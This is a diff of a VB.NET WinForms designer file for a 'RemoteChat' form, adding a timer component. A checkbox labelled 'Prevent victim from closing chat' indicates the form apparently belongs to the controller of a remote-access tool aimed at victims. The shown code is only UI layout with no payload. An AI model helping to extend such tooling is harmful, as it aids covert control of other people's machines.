@@ -22,6 +22,7 @@ Partial Class RemoteChat
     'Ne la modifiez pas à l'aide de l'éditeur de code.
     <System.Diagnostics.DebuggerStepThrough()>
     Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
         Me.chatWindow = New System.Windows.Forms.RichTextBox()
         Me.messageTB = New System.Windows.Forms.TextBox()
         Me.sendButton = New System.Windows.Forms.Button()
@@ -29,6 +30,7 @@ Partial Class RemoteChat
         Me.showIconCB = New System.Windows.Forms.CheckBox()
         Me.allowCloseChatCB = New System.Windows.Forms.CheckBox()
         Me.chatFluxManager = New System.ComponentModel.BackgroundWorker()
+        Me.cooldownTimer = New System.Windows.Forms.Timer(Me.components)
         Me.SuspendLayout()
         '
         'chatWindow
@@ -91,6 +93,10 @@ Partial Class RemoteChat
         Me.allowCloseChatCB.Text = "Prevent victim from closing chat"
         Me.allowCloseChatCB.UseVisualStyleBackColor = True
         '
+        'cooldownTimer
+        '
+        Me.cooldownTimer.Enabled = True
+        '
         'RemoteChat
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
@@ -118,4 +124,5 @@ Partial Class RemoteChat
     Friend WithEvents showIconCB As CheckBox
     Friend WithEvents allowCloseChatCB As CheckBox
     Friend WithEvents chatFluxManager As System.ComponentModel.BackgroundWorker
+    Friend WithEvents cooldownTimer As Timer
 End Class
